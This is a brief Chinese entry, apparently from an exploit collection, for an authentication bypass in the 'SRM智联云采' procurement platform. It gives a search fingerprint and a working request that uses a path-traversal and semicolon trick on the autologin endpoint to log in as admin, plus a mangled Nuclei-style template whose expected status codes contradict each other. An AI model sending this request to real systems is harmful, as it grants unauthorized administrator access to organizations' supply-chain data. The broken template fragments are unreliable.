# SRM智联云采系统autologin逻辑漏洞

- **系统**：SRM　|　**类型**：逻辑缺陷　|　**CVE**：—
- **指纹**：`title=="SRM 2.0"`
- **请求**：`GET /adpweb/static/%2e%2e;/api/sys/app/autologin?loginName=admin HTTP/1.1`
- **关键头**：`id: zhicaiyun-autologin-loginbypass`　`name: zhicaiyun-autologin-loginbypass`　`author: HK`　`severity: high`

**请求体 / payload**
```
- raw:
-
Host: {{Hostname}}
matchers:
- type: dsl
dsl:
- status_code==302 && contains_all(all_headers,"/adpweb/a;")
```
- **预期**：200　|　adpweb